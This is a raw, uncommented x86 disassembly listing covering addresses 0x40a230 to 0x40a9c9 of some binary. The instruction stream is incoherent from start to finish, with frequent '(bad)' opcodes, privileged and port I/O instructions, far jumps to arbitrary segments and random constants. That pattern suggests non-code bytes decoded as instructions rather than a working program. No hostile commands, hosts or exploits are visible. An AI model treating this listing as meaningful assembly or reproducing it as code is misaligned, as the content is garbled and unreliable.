  40a230:	fcmovbe st,st(3)
  40a232:	pop    ss
  40a233:	and    edi,DWORD PTR [edi]
  40a235:	cmp    esp,DWORD PTR [ebx-0x7cb1dc9f]
  40a23b:	loope  0x40a26c
  40a23d:	(bad)  
  40a23e:	cs js  0x40a20e
  40a241:	add    eax,0x81204278
  40a246:	xor    ebx,DWORD PTR [eax+0x6025edbd]
  40a24c:	fs ja  0x40a236
  40a24f:	jbe    0x40a26c
  40a251:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a252:	call   0x7273515b
  40a257:	jmp    0x506ee88c
  40a25c:	call   0xc24ac31f
  40a261:	add    BYTE PTR [edi-0xc],cl
  40a264:	push   es
  40a265:	jmp    0x3b45:0xe463792d
  40a26c:	or     al,0xe0
  40a26e:	arpl   bx,cx
  40a270:	xchg   ebp,eax
  40a271:	scas   eax,DWORD PTR es:[edi]
  40a272:	pop    es
  40a273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a274:	adc    ah,BYTE PTR [ecx-0x68]
  40a277:	pop    edi
  40a278:	add    ch,BYTE PTR [edi+0x47]
  40a27b:	push   ds
  40a27c:	mov    eax,esi
  40a27e:	pop    edx
  40a27f:	(bad)  
  40a280:	sbb    ch,BYTE PTR [edi+0x37]
  40a283:	stos   DWORD PTR es:[edi],eax
  40a284:	push   es
  40a285:	inc    edi
  40a286:	sbb    bh,0xf2
  40a289:	mov    bh,0x34
  40a28b:	xor    eax,0xb4ae0aa9
  40a290:	les    ebx,FWORD PTR [eax+0x63]
  40a293:	icebp  
  40a294:	and    eax,0x56a515ae
  40a299:	sti    
  40a29a:	push   es
  40a29b:	dec    edx
  40a29c:	jb     0x40a2a1
  40a29e:	iret   
  40a29f:	or     al,BYTE PTR [edx+0x1c]
  40a2a2:	sbb    ch,cl
  40a2a4:	or     DWORD PTR [esi+0x46],0x5b0f583d
  40a2ab:	jno    0x40a247
  40a2ad:	push   ebp
  40a2ae:	cmp    cl,BYTE PTR [ecx]
  40a2b0:	in     eax,dx
  40a2b1:	in     eax,0x44
  40a2b3:	mov    ebp,0x9fec2b89
  40a2b8:	out    dx,eax
  40a2b9:	pop    ds
  40a2ba:	mov    bl,0x15
  40a2bc:	scas   eax,DWORD PTR es:[edi]
  40a2bd:	xchg   edx,eax
  40a2be:	adc    dl,ch
  40a2c0:	mov    BYTE PTR [eax+0x72],0xbf
  40a2c4:	(bad)  
  40a2c5:	jmp    0xa692ec19
  40a2ca:	pop    ecx
  40a2cb:	xor    BYTE PTR [ecx+0x6a],bl
  40a2ce:	dec    eax
  40a2cf:	es ins BYTE PTR es:[edi],dx
  40a2d1:	push   edi
  40a2d2:	test   eax,0x95c5e76d
  40a2d7:	dec    edx
  40a2d8:	and    al,BYTE PTR [esi-0x82f4311]
  40a2de:	sbb    edi,DWORD PTR [ebp-0x75]
  40a2e1:	adc    al,0xbe
  40a2e3:	lods   eax,DWORD PTR ds:[esi]
  40a2e4:	sub    ebx,ebp
  40a2e6:	out    0xbb,eax
  40a2e8:	or     bl,BYTE PTR [esi]
  40a2ea:	xlat   BYTE PTR ds:[ebx]
  40a2eb:	arpl   WORD PTR [ebx+esi*2],dx
  40a2ee:	in     al,0x7e
  40a2f0:	and    DWORD PTR [esi+edi*4],ecx
  40a2f3:	dec    eax
  40a2f4:	mov    ebx,0xfba22ab5
  40a2f9:	lods   eax,DWORD PTR ds:[esi]
  40a2fa:	xchg   ecx,eax
  40a2fb:	ins    BYTE PTR es:[edi],dx
  40a2fc:	cld    
  40a2fd:	or     DWORD PTR [ecx+0x1f],esp
  40a300:	inc    eax
  40a301:	and    ebp,ebp
  40a303:	gs push edi
  40a305:	cld    
  40a306:	fs push 0xffffffb3
  40a309:	xchg   edx,esp
  40a30b:	sahf   
  40a30c:	xor    ecx,DWORD PTR [ecx+0x7f]
  40a30f:	sbb    DWORD PTR [eax+0x17c52c54],edx
  40a315:	fldcw  WORD PTR [esi+0x13e2b84b]
  40a31b:	sbb    eax,0xfc2f9c45
  40a320:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a321:	sub    al,0x47
  40a323:	sub    BYTE PTR [edx-0x409bfc83],bl
  40a329:	and    BYTE PTR [ecx-0x64],dh
  40a32c:	xor    ebp,esi
  40a32e:	in     al,0xba
  40a330:	mov    edx,0x44f240e0
  40a335:	mov    ecx,0x7ae9a2a2
  40a33a:	mov    dl,0x23
  40a33c:	xor    eax,0x8700cacc
  40a341:	mov    esp,0x2cba313
  40a346:	mov    DWORD PTR [ebp+0x41],edi
  40a349:	mov    ebx,0x67d88495
  40a34e:	lods   al,BYTE PTR ds:[esi]
  40a34f:	jp     0x40a3c3
  40a351:	sbb    bh,bh
  40a353:	mov    ah,0x3f
  40a355:	sub    al,0xa1
  40a357:	addr16 push ss
  40a359:	pop    ecx
  40a35a:	and    ebp,ebp
  40a35c:	repnz mov esp,0xb51c07fa
  40a362:	das    
  40a363:	fstp   TBYTE PTR [esi]
  40a365:	xlat   BYTE PTR ds:[ebx]
  40a366:	xor    esp,edx
  40a368:	addr16 call 0xd4b7:0xcaac917b
  40a370:	popf   
  40a371:	xor    esp,edi
  40a373:	add    bl,ch
  40a375:	pop    esp
  40a376:	sbb    ecx,edi
  40a378:	push   cs
  40a379:	push   cs
  40a37a:	test   al,0x79
  40a37c:	push   ebx
  40a37d:	fcmovnbe st,st(2)
  40a37f:	mov    dl,0x37
  40a381:	cmp    eax,0x8b333fc9
  40a386:	cmp    DWORD PTR ds:[edx],esp
  40a389:	aam    0xa3
  40a38b:	aad    0xf8
  40a38d:	sar    BYTE PTR [edx],cl
  40a38f:	nop
  40a390:	lea    esp,[eax]
  40a392:	scas   eax,DWORD PTR es:[edi]
  40a393:	lock mov ebx,0x108d1de2
  40a399:	inc    ecx
  40a39a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a39b:	call   FWORD PTR [edi-0x18b478dc]
  40a3a1:	leave  
  40a3a2:	pop    es
  40a3a3:	(bad)  
  40a3a4:	nop
  40a3a5:	pop    esp
  40a3a6:	mov    bl,0x14
  40a3a8:	(bad)  
  40a3aa:	xchg   ebx,eax
  40a3ab:	jmp    0x40a3a6
  40a3ad:	aam    0xf9
  40a3af:	mov    dl,0x1
  40a3b1:	fs nop
  40a3b3:	adc    BYTE PTR [ebx-0x58],ch
  40a3b6:	pop    eax
  40a3b7:	mov    edi,DWORD PTR [ebp-0x79]
  40a3ba:	test   eax,0xb155b0a4
  40a3bf:	xor    edi,esp
  40a3c1:	dec    eax
  40a3c2:	mov    esp,0xc0dbb242
  40a3c7:	jae    0x40a3ef
  40a3c9:	paddw  mm7,mm6
  40a3cc:	call   0xf6fd:0xbbc5875f
  40a3d3:	adc    eax,ebp
  40a3d5:	dec    ebx
  40a3d6:	or     bl,BYTE PTR ds:0xaee50721
  40a3dc:	sbb    DWORD PTR ds:0x95c96d3a,esi
  40a3e2:	cs inc esi
  40a3e4:	fdivrp st(2),st
  40a3e6:	sbb    al,0xa
  40a3e8:	cmc    
  40a3e9:	ds adc al,0xc9
  40a3ec:	sahf   
  40a3ed:	and    ebp,edi
  40a3ef:	mov    ecx,0x65821f65
  40a3f4:	scas   eax,DWORD PTR es:[edi]
  40a3f5:	sti    
  40a3f6:	adc    eax,0xbf9fd11e
  40a3fb:	dec    esi
  40a3fc:	jge    0x40a3f4
  40a3fe:	push   0xffffff9b
  40a400:	rcl    ebx,0xfd
  40a403:	xchg   ebp,eax
  40a404:	inc    eax
  40a405:	addr16 pop esi
  40a407:	popa   
  40a408:	or     DWORD PTR [ecx],eax
  40a40a:	add    eax,0xbcd2a488
  40a40f:	add    eax,0x9eabd5ca
  40a414:	repz xor DWORD PTR [edx],edx
  40a417:	in     al,dx
  40a418:	loope  0x40a407
  40a41a:	inc    eax
  40a41b:	push   esi
  40a41c:	test   eax,0xa2ac9121
  40a421:	mov    edx,0xc5ea9193
  40a426:	jno    0x40a427
  40a428:	pushf  
  40a429:	push   esp
  40a42a:	sub    al,0x8b
  40a42c:	loop   0x40a3cc
  40a42e:	ins    BYTE PTR es:[edi],dx
  40a42f:	jb     0x40a3e0
  40a431:	jp     0x40a434
  40a433:	jbe    0x40a478
  40a435:	ret    0xf737
  40a438:	xchg   ecx,eax
  40a439:	xchg   ecx,eax
  40a43a:	xchg   BYTE PTR [edx],bl
  40a43c:	sub    ch,BYTE PTR ds:0x574d7b86
  40a442:	pop    es
  40a443:	in     al,0x32
  40a445:	mov    bl,dh
  40a447:	jl     0x40a3ff
  40a449:	inc    edx
  40a44a:	or     DWORD PTR [eax+eiz*8-0x40],esi
  40a44e:	ret    
  40a44f:	push   eax
  40a450:	scas   eax,DWORD PTR es:[edi]
  40a451:	jge    0x40a486
  40a453:	and    dl,BYTE PTR [edx+0x72]
  40a456:	dec    edi
  40a457:	sti    
  40a458:	add    bl,al
  40a45a:	loopne 0x40a3f4
  40a45c:	dec    ebp
  40a45d:	adc    bh,ch
  40a45f:	adc    ebp,DWORD PTR [ecx+0x1501d284]
  40a465:	push   ds
  40a466:	inc    eax
  40a467:	sbb    al,BYTE PTR [edi-0x7fa06882]
  40a46d:	add    DWORD PTR [ebx+ecx*1],0xa4c688a4
  40a474:	mov    ah,0xf8
  40a476:	stc    
  40a477:	scas   eax,DWORD PTR es:[edi]
  40a478:	or     esi,DWORD PTR [edi+0x6]
  40a47b:	sbb    BYTE PTR [edx],ah
  40a47d:	adc    ebx,DWORD PTR [edx+0x7c]
  40a480:	cmp    ecx,ebp
  40a482:	sub    bl,dh
  40a484:	leave  
  40a485:	(bad)  
  40a487:	mov    BYTE PTR [ecx+ebx*8-0x2e],bl
  40a48b:	pop    edx
  40a48c:	mov    ?,WORD PTR [edi-0x60]
  40a48f:	xchg   al,dh
  40a491:	in     al,dx
  40a492:	test   BYTE PTR [ecx+0x4016e45e],bh
  40a498:	aaa    
  40a499:	xor    eax,0xec3b4aa2
  40a49e:	sbb    eax,0x2d873000
  40a4a3:	popf   
  40a4a4:	mov    eax,ds:0x7b252a76
  40a4aa:	dec    ebp
  40a4ab:	push   es
  40a4ac:	or     eax,0x9c00c795
  40a4b1:	das    
  40a4b2:	sub    DWORD PTR [edx+0x1d09fa36],edx
  40a4b8:	or     cl,BYTE PTR ds:0xc8663cc8
  40a4be:	or     eax,0xe435616a
  40a4c3:	fisttp DWORD PTR [edi]
  40a4c5:	popa   
  40a4c6:	imul   edi,ebx,0x848be45f
  40a4cc:	mov    eax,ds:0x1b05dc12
  40a4d1:	sbb    edi,DWORD PTR [edx-0x3f]
  40a4d4:	mov    cl,BYTE PTR [edi+0x7d9b53b7]
  40a4da:	xchg   ebp,eax
  40a4db:	xor    eax,0x8267a5f8
  40a4e0:	lods   al,BYTE PTR ds:[esi]
  40a4e1:	inc    ebp
  40a4e2:	jp     0x40a4e3
  40a4e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4e5:	mov    edx,0xffdbe71b
  40a4ea:	fadd   st(3),st
  40a4ec:	nop
  40a4ed:	lods   al,BYTE PTR ds:[esi]
  40a4ee:	mov    edi,0x2ca3e26f
  40a4f3:	mov    WORD PTR [ecx],?
  40a4f5:	adc    DWORD PTR [esi+edx*4],0xc72152c8
  40a4fc:	inc    ebx
  40a4fd:	mov    ds:0xa0aa3db5,al
  40a502:	repz aas 
  40a504:	rol    DWORD PTR ds:0x9af13001,1
  40a50a:	cli    
  40a50b:	add    eax,0xe2d30c18
  40a510:	jl     0x40a500
  40a512:	shr    BYTE PTR ss:[ebp-0x10],1
  40a516:	sbb    al,0xb7
  40a518:	mov    dh,0x10
  40a51a:	and    ebx,esi
  40a51c:	repnz ds xor eax,0x793b29d2
  40a523:	aad    0xe7
  40a525:	sub    cl,BYTE PTR [edi]
  40a527:	ja     0x40a4ec
  40a529:	mov    cl,ah
  40a52b:	out    0x80,al
  40a52d:	xchg   ebp,eax
  40a52e:	outs   dx,BYTE PTR ds:[esi]
  40a52f:	sub    al,0x9
  40a531:	xchg   ecx,eax
  40a532:	and    ah,BYTE PTR [ecx-0x6a]
  40a535:	(bad)  
  40a536:	jmp    0x6fbc3494
  40a53b:	mov    eax,ds:0x59b70ad9
  40a540:	test   BYTE PTR [ebp+0x29],ah
  40a543:	dec    esp
  40a544:	sbb    eax,0xaace6740
  40a549:	imul   edi,DWORD PTR [ebp+eax*2+0x54d4e173],0xaab54237
  40a554:	or     DWORD PTR [esi-0x1f98e48e],ebp
  40a55a:	jo     0x40a59f
  40a55c:	inc    ebx
  40a55d:	inc    esp
  40a55e:	aam    0xf3
  40a560:	jle    0x40a5b5
  40a562:	shr    BYTE PTR [eax],0xaf
  40a565:	add    BYTE PTR [esi+0x6b],ah
  40a568:	cs sub al,0x73
  40a56b:	jae    0x40a5af
  40a56d:	js     0x40a4fa
  40a56f:	clc    
  40a570:	sar    DWORD PTR [eax-0x39b62c38],cl
  40a576:	mov    ecx,0x42d6a0ea
  40a57b:	inc    edx
  40a57c:	das    
  40a57d:	cdq    
  40a57e:	aaa    
  40a57f:	idiv   DWORD PTR [ebx]
  40a581:	lahf   
  40a582:	xor    ebx,0x39
  40a585:	sub    BYTE PTR [edi+0x16a26273],cl
  40a58b:	lock rcl DWORD PTR [esi-0x313d9bc],cl
  40a592:	mov    cl,0x59
  40a594:	(bad)  
  40a595:	dec    edi
  40a596:	sahf   
  40a597:	test   BYTE PTR [ebx+0x4dd7fdc0],bl
  40a59d:	lea    ecx,[eax-0x58f5d0cc]
  40a5a3:	loope  0x40a59c
  40a5a5:	inc    esp
  40a5a6:	or     esi,DWORD PTR ds:0xedc47073
  40a5ac:	push   edi
  40a5ad:	outs   dx,DWORD PTR ds:[esi]
  40a5ae:	outs   dx,BYTE PTR ds:[esi]
  40a5af:	push   0xffffff8a
  40a5b1:	add    BYTE PTR [ebp+0x209ed307],cl
  40a5b7:	push   ebx
  40a5b8:	ficomp WORD PTR [ebp-0x59]
  40a5bb:	push   eax
  40a5bc:	lods   eax,DWORD PTR ds:[esi]
  40a5bd:	sub    al,0x4f
  40a5bf:	retw   
  40a5c1:	call   0x10aa:0x7ca7093
  40a5c8:	push   0x2ef5108a
  40a5cd:	add    al,BYTE PTR [ecx+ebp*4+0x46913eff]
  40a5d4:	iret   
  40a5d5:	data16 sbb al,0xc6
  40a5d8:	adc    DWORD PTR [ecx],0x7dcf95ed
  40a5de:	jbe    0x40a5c7
  40a5e0:	adc    bh,bl
  40a5e2:	idiv   BYTE PTR [edx-0x23e86883]
  40a5e8:	rcl    DWORD PTR [edx-0x27],1
  40a5eb:	mov    edi,0x548c37e8
  40a5f0:	xchg   BYTE PTR [esi+0x108ed446],al
  40a5f6:	test   DWORD PTR [edi-0xc30b3cb],ecx
  40a5fc:	sbb    ah,BYTE PTR [ebx+0x7c74c45d]
  40a602:	in     al,0x87
  40a604:	lock test al,0x5a
  40a607:	outs   dx,DWORD PTR ds:[esi]
  40a608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a609:	jge    0x40a615
  40a60b:	xchg   dh,dh
  40a60d:	(bad)  
  40a60e:	gs adc ebp,edi
  40a611:	sub    cl,BYTE PTR [ebp+0x443fd9a5]
  40a617:	sub    DWORD PTR [edx+0x60],0x9
  40a61b:	call   0xd869ddbd
  40a620:	sub    bh,ch
  40a622:	ret    
  40a623:	ins    BYTE PTR es:[edi],dx
  40a624:	xor    al,0xd8
  40a626:	mov    WORD PTR [eax+0x5a68d614],?
  40a62c:	jns    0x40a68c
  40a62e:	aad    0x67
  40a630:	lods   al,BYTE PTR ds:[esi]
  40a631:	std    
  40a632:	ss jmp 0x8b3b:0x8e5f4bdd
  40a63a:	addr16 es out 0x36,eax
  40a63e:	pusha  
  40a63f:	mov    fs,WORD PTR [edx+0x5f1fafd9]
  40a645:	cli    
  40a646:	retf   0xf223
  40a649:	movq   QWORD PTR [ecx+0x42],mm7
  40a64d:	sbb    esp,ecx
  40a64f:	fimul  WORD PTR [ebp-0x46]
  40a652:	dec    edx
  40a653:	hlt    
  40a654:	aad    0x96
  40a656:	sub    eax,0x9abd1c48
  40a65b:	inc    edi
  40a65c:	fnsave [edi-0x386883e3]
  40a662:	addr16 pop ecx
  40a664:	daa    
  40a665:	dec    edi
  40a666:	sbb    DWORD PTR ds:0x7501e59f,eax
  40a66c:	mov    gs,WORD PTR [ebx]
  40a66e:	ja     0x40a6ce
  40a670:	addr16 jae 0x40a69b
  40a673:	mov    edi,0x3ac666ec
  40a678:	nop
  40a679:	into   
  40a67a:	adc    ebp,DWORD PTR [ebx]
  40a67c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a67d:	in     al,dx
  40a67e:	or     DWORD PTR [edx+0x243117bb],esp
  40a684:	sub    esi,DWORD PTR [eax+ebp*2]
  40a687:	push   eax
  40a688:	push   edx
  40a689:	fmul   DWORD PTR [ecx+ebx*2]
  40a68c:	ret    
  40a68d:	dec    ah
  40a68f:	cli    
  40a690:	inc    edx
  40a691:	retf   0x1c96
  40a694:	into   
  40a695:	mov    ds,WORD PTR fs:[esi-0x13]
  40a699:	push   ecx
  40a69a:	loop   0x40a685
  40a69c:	or     cl,BYTE PTR [esi+ebx*4-0x6c]
  40a6a0:	sti    
  40a6a1:	dec    ebp
  40a6a2:	outs   dx,DWORD PTR ds:[esi]
  40a6a3:	iret   
  40a6a4:	addr16 in al,0x90
  40a6a7:	mov    ds:0x16226f2e,eax
  40a6ac:	fstp   QWORD PTR [ebp-0x50]
  40a6af:	inc    esi
  40a6b0:	push   ebp
  40a6b1:	mov    al,0xb3
  40a6b3:	push   0xffffff82
  40a6b5:	sub    ebp,DWORD PTR [esi-0x7b]
  40a6b8:	ror    BYTE PTR [ebx],0xa8
  40a6bb:	mov    DWORD PTR [edi-0x80],0x534a6c74
  40a6c2:	(bad)  
  40a6c3:	sbb    al,0xc8
  40a6c5:	mov    eax,0xd31b4c2a
  40a6ca:	mov    al,BYTE PTR [ebx]
  40a6cc:	ds jp  0x40a743
  40a6cf:	mov    DWORD PTR [ecx+esi*8],ebx
  40a6d2:	sahf   
  40a6d3:	sbb    ebp,DWORD PTR [ebp+0x47791d6d]
  40a6d9:	cdq    
  40a6da:	in     al,0xfc
  40a6dc:	and    al,dl
  40a6de:	adc    al,0x99
  40a6e0:	xchg   esp,eax
  40a6e1:	mov    ds:0x521a7044,eax
  40a6e6:	add    edi,DWORD PTR ss:[ecx+0x23]
  40a6ea:	add    DWORD PTR [esi],esi
  40a6ec:	std    
  40a6ed:	iret   
  40a6ee:	shl    DWORD PTR [edx-0x68ddc8c4],0xd6
  40a6f5:	adc    BYTE PTR [ecx+0x6d],ch
  40a6f8:	scas   eax,DWORD PTR es:[edi]
  40a6f9:	pop    edx
  40a6fa:	dec    edi
  40a6fb:	mov    ds:0xbc0e9766,eax
  40a700:	popf   
  40a701:	cmp    ah,BYTE PTR ds:0x111291d
  40a707:	dec    ebp
  40a708:	inc    cx
  40a70a:	inc    esp
  40a70b:	pop    ds
  40a70c:	xor    eax,0x3cca8ee
  40a711:	sub    esp,edi
  40a713:	(bad)  
  40a714:	leave  
  40a715:	idiv   BYTE PTR [eax-0x71]
  40a718:	mov    al,ds:0xd6d85c67
  40a71d:	push   esi
  40a71e:	jne    0x40a6d9
  40a720:	or     BYTE PTR [edx],dh
  40a722:	test   eax,0x663cf45d
  40a727:	rcr    DWORD PTR [edx+edi*2+0x7c],cl
  40a72b:	enter  0xa39f,0xaa
  40a72f:	adc    eax,0x9c12568d
  40a734:	mov    ah,0x60
  40a736:	push   ebp
  40a737:	and    eax,0x3561e8b1
  40a73c:	lds    ebx,FWORD PTR [edi+0x357a7241]
  40a742:	dec    edx
  40a743:	je     0x40a79b
  40a745:	stc    
  40a746:	add    bl,al
  40a748:	hlt    
  40a749:	(bad)  
  40a74a:	ror    DWORD PTR [eax-0x5625172d],1
  40a750:	retf   
  40a751:	mov    ds:0xbb13d722,eax
  40a756:	inc    edi
  40a757:	js     0x40a77c
  40a759:	call   0xc106:0x2b07b0e2
  40a760:	ret    
  40a761:	pop    ds
  40a762:	pop    ss
  40a763:	lock scas eax,DWORD PTR es:[edi]
  40a765:	jl     0x40a793
  40a767:	sub    bh,BYTE PTR [eax+edx*4+0x68]
  40a76b:	fdiv   DWORD PTR [edi+esi*8+0x1f]
  40a76f:	sbb    ch,0xe
  40a772:	mov    esp,0x9f61d642
  40a777:	nop
  40a778:	ja     0x40a7e5
  40a77a:	fld    DWORD PTR [edi+0x38]
  40a77d:	cmp    edx,DWORD PTR [ebx]
  40a77f:	add    dl,al
  40a781:	mov    eax,ds:0x6cc3f7d0
  40a786:	add    BYTE PTR [esi],0xe3
  40a789:	mov    ds:0x7c26a48e,eax
  40a78e:	int3   
  40a78f:	xor    al,BYTE PTR [edx-0x1552378d]
  40a795:	fiadd  DWORD PTR [esi+0x1a]
  40a798:	nop
  40a799:	bound  ecx,QWORD PTR [edi]
  40a79b:	aas    
  40a79c:	(bad)
  40a79f:	mov    eax,0x86468ba0
  40a7a4:	dec    ebp
  40a7a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7a6:	add    eax,ecx
  40a7a8:	cmp    edx,DWORD PTR [ecx]
  40a7aa:	mov    es,WORD PTR [edx+0x7f]
  40a7ad:	pop    ecx
  40a7ae:	lock mov dl,0xe2
  40a7b1:	adc    esp,esp
  40a7b3:	(bad)
  40a7b6:	jg     0x3a1191da
  40a7bc:	mov    ch,0x23
  40a7be:	inc    ebx
  40a7bf:	in     eax,0x70
  40a7c1:	popf   
  40a7c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7c3:	push   ebx
  40a7c4:	rcl    BYTE PTR cs:[ecx],0x2e
  40a7c8:	lea    ecx,[ebp+0x4c0d2fd9]
  40a7ce:	pop    edx
  40a7cf:	(bad)  
  40a7d0:	retf   0x5bd1
  40a7d3:	ss stc 
  40a7d5:	pop    ebp
  40a7d6:	mov    BYTE PTR [ecx-0x4155e1fd],dl
  40a7dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7dd:	add    esi,esp
  40a7df:	or     ecx,eax
  40a7e1:	pop    ebp
  40a7e2:	dec    esi
  40a7e3:	dec    esp
  40a7e4:	ja     0x40a81a
  40a7e6:	pop    ss
  40a7e7:	stos   BYTE PTR es:[edi],al
  40a7e8:	mov    ch,0x6f
  40a7ea:	test   esp,ecx
  40a7ec:	mov    WORD PTR [eax+0x8f32ea0],fs
  40a7f2:	and    BYTE PTR [ebp+0x38],ah
  40a7f5:	dec    edi
  40a7f6:	stos   BYTE PTR es:[edi],al
  40a7f7:	pop    edx
  40a7f8:	dec    eax
  40a7f9:	std    
  40a7fa:	mov    ah,0x29
  40a7fc:	pop    esp
  40a7fd:	sti    
  40a7fe:	loop   0x40a7fe
  40a800:	shl    DWORD PTR ds:0x9a97e7a8,cl
  40a806:	inc    edx
  40a807:	and    BYTE PTR [ecx],bl
  40a809:	fwait
  40a80a:	pop    edx
  40a80b:	sbb    eax,0x7595d529
  40a810:	stos   DWORD PTR es:[edi],eax
  40a811:	fstp   TBYTE PTR [eax+0x27191f52]
  40a817:	xlat   BYTE PTR ds:[ebx]
  40a818:	push   eax
  40a819:	icebp  
  40a81a:	repz es ja 0x40a7ad
  40a81e:	scas   al,BYTE PTR es:[edi]
  40a81f:	mov    ecx,DWORD PTR [ebx-0x5f]
  40a822:	adc    eax,DWORD PTR [esi+0x265f4cf5]
  40a828:	inc    edx
  40a829:	dec    edx
  40a82a:	or     bl,ah
  40a82c:	fisub  DWORD PTR [eax]
  40a82e:	aad    0xde
  40a830:	jno    0x40a7b2
  40a832:	mov    edx,0xb30c52ce
  40a837:	xchg   ebx,eax
  40a838:	data16 sub BYTE PTR [edx-0x4e785bb0],cl
  40a83f:	rol    ch,cl
  40a841:	out    0x71,eax
  40a843:	mov    edi,0x6cb5435c
  40a848:	lahf   
  40a849:	mov    bl,BYTE PTR [edi-0x24ca87b7]
  40a84f:	scas   eax,DWORD PTR es:[edi]
  40a850:	inc    ebx
  40a851:	xchg   ebp,eax
  40a852:	rol    BYTE PTR [edx],0x44
  40a855:	cmp    al,0xd
  40a857:	mov    cl,0x6e
  40a859:	sub    ebx,DWORD PTR [eax]
  40a85b:	test   DWORD PTR [esi],eax
  40a85d:	mov    cs,WORD PTR [ebx+0x49bfdd5c]
  40a863:	aaa    
  40a864:	scas   eax,DWORD PTR es:[edi]
  40a865:	jmp    0x40a852
  40a867:	jl     0x40a888
  40a869:	xchg   dl,cl
  40a86b:	inc    ebx
  40a86c:	add    ch,BYTE PTR ds:0x5c39d836
  40a872:	jmp    0x9f14:0x60d0bd3f
  40a879:	sub    cl,BYTE PTR [ebx-0x32e6017b]
  40a87f:	fnstsw WORD PTR [ecx+0x40]
  40a882:	cs test eax,0x9d594ba9
  40a888:	(bad)  
  40a889:	fbld   TBYTE PTR [ebx+0x3853d611]
  40a88f:	fld    QWORD PTR [esi+ebx*2-0x8]
  40a893:	mov    BYTE PTR ds:0x83509682,dl
  40a899:	and    edx,DWORD PTR [esi]
  40a89b:	or     cl,BYTE PTR [ebx-0x10]
  40a89e:	retf   
  40a89f:	adc    edx,DWORD PTR [edx]
  40a8a1:	loop   0x40a871
  40a8a3:	(bad)  
  40a8a4:	cmp    BYTE PTR [eax+0x638d6932],cl
  40a8aa:	test   DWORD PTR [edx+0x43b8b233],0xe580d1f2
  40a8b4:	dec    edi
  40a8b5:	cmp    eax,0x78c16c7
  40a8ba:	lds    edx,FWORD PTR [edi]
  40a8bc:	push   esi
  40a8bd:	into   
  40a8be:	lods   eax,DWORD PTR ds:[esi]
  40a8bf:	push   ss
  40a8c0:	in     al,0x8f
  40a8c2:	push   cs
  40a8c3:	jle    0x40a91a
  40a8c5:	cld    
  40a8c6:	add    eax,0x63092c91
  40a8cb:	mov    DWORD PTR [esi+0x1f],edx
  40a8ce:	hlt    
  40a8cf:	pop    ds
  40a8d0:	xchg   ebx,eax
  40a8d1:	mov    ah,0xcf
  40a8d3:	mov    esi,0x44d4893c
  40a8d8:	bound  edi,QWORD PTR [esi+0xa89c1e]
  40a8de:	aam    0x43
  40a8e0:	jmp    0xc275:0x629ccbfb
  40a8e7:	lods   eax,DWORD PTR ds:[esi]
  40a8e8:	or     BYTE PTR [edi-0x67e90f84],dh
  40a8ee:	add    ah,BYTE PTR [eax-0x3a]
  40a8f1:	xchg   ebp,eax
  40a8f2:	icebp  
  40a8f3:	fsin   
  40a8f5:	es in  al,0x65
  40a8f8:	cmp    eax,0x4725fec5
  40a8fd:	mov    ebx,0x27e588c4
  40a902:	cmp    ah,ah
  40a904:	xchg   esp,eax
  40a905:	outs   dx,DWORD PTR ds:[esi]
  40a906:	call   0x3261:0xedde0a59
  40a90d:	mov    eax,0xe3353ac3
  40a912:	test   eax,0xac05d9d1
  40a917:	imul   eax,DWORD PTR [ebx-0x74],0xdb4f5741
  40a91e:	sbb    BYTE PTR [eax+0x5e1d93fe],cl
  40a924:	xor    BYTE PTR [ebx],bh
  40a926:	out    0x40,eax
  40a928:	and    BYTE PTR [ebx],dh
  40a92a:	je     0x40a944
  40a92c:	aad    0xf5
  40a92e:	jg     0x40a978
  40a930:	jnp    0x40a8d5
  40a932:	cli    
  40a933:	push   es
  40a934:	pop    edi
  40a935:	push   0x37005ac5
  40a93a:	mov    eax,0x1b098437
  40a93f:	xor    al,0x78
  40a941:	push   eax
  40a942:	jecxz  0x40a8e1
  40a944:	xor    eax,0x14a7831c
  40a949:	imul   edi,DWORD PTR [ebp+0x19],0xffffffd8
  40a94d:	lea    esi,[esi]
  40a94f:	pop    ebx
  40a950:	mov    ebx,0x46ef0a09
  40a955:	jle    0x40a909
  40a957:	mov    ds,WORD PTR [esp+edi*2]
  40a95a:	sbb    eax,DWORD PTR [eax-0x1d]
  40a95d:	mov    ebp,0x6c249584
  40a962:	(bad)  
  40a964:	mov    edi,0xbd2f2ec6
  40a969:	ret    
  40a96a:	retf   0xa19f
  40a96d:	xor    al,0x7e
  40a96f:	push   ss
  40a970:	pop    edi
  40a971:	and    bl,al
  40a973:	fcmove st,st(2)
  40a975:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a976:	pop    esi
  40a977:	stos   DWORD PTR es:[edi],eax
  40a978:	sahf   
  40a979:	cdq    
  40a97a:	inc    esi
  40a97b:	jnp    0x40a9c8
  40a97d:	sti    
  40a97e:	sub    eax,0x7ee95fe1
  40a983:	jb     0x40a98d
  40a985:	jbe    0x40a9de
  40a987:	push   cs
  40a988:	data16 shl BYTE PTR [ebp+0x78],cl
  40a98c:	dec    esp
  40a98d:	xchg   ebp,eax
  40a98e:	dec    edx
  40a98f:	sbb    eax,0x4fb55ee4
  40a994:	ins    DWORD PTR es:[edi],dx
  40a995:	cmp    BYTE PTR ds:0x91bd8a1c,al
  40a99b:	dec    edi
  40a99c:	adc    ah,ah
  40a99e:	xor    DWORD PTR [ebp+ecx*8+0x6106bd5b],ebx
  40a9a5:	cmp    eax,DWORD PTR [edx+0x2b]
  40a9a8:	pop    es
  40a9a9:	fs jge 0x40a94c
  40a9ac:	push   ss
  40a9ad:	rcr    DWORD PTR [eax+0xd55b503],0x98
  40a9b4:	and    eax,0xcdbbd92b
  40a9b9:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40a9bb:	adc    BYTE PTR [edx+0x36],0xe5
  40a9bf:	inc    edx
  40a9c0:	loop   0x40a990
  40a9c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9c3:	ds out 0x3b,al
  40a9c6:	aad    0xc4
  40a9c8:	push   edi
  40a9c9:	and    esp,ecx
